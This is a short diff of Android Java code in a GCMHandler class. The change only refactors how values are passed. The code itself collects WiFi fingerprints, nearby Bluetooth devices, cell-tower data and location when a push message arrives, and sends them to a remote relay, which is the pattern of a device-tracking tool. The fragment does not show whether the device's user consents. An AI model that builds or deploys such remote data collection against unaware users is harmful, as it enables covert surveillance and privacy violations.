@@ -48,16 +48,19 @@ class GCMHandler {
         String gcm_fingerprint_relay = shared.getString("gcm_fingerprint_relay", null);
 
         if(comparator(gcm_fingerprint_relay) && extraComparator(relay)){
-            new GCMRelay().executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR , new String[]{relay, new WiFiFingerprinter(context).getResults()});
+            String w = new WiFiFingerprinter(context).getResults();
+            new GCMRelay().executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR , new String[]{relay, w});
         }
         if(comparator(gcm_relay_location) && extraComparator(relay)){
             context.sendBroadcast(new Intent().setAction("oliver.intent.action.GCM").putExtra("STRING", new String[]{"location", relay}));
         }
         if(comparator(gcm_beacon_relay) && extraComparator(relay)){
-            new GCMRelay().executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR , new String[]{relay, new BTNearby(context).run()});
+            String bt = new BTNearby(context).run();
+            new GCMRelay().executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR , new String[]{relay, bt});
         }
         if(comparator(gcm_cell_tower_relay) && extraComparator(relay)){
-            new GCMRelay().executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR , new String[]{relay, new CellTowerHelper(context).getAll()});
+            String cell = new CellTowerHelper(context).getAll();
+            new GCMRelay().executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR , new String[]{relay, cell});
         }
         if(comparator(gcm_calls_relay) && extraComparator(relay)){
             int calls = 5;
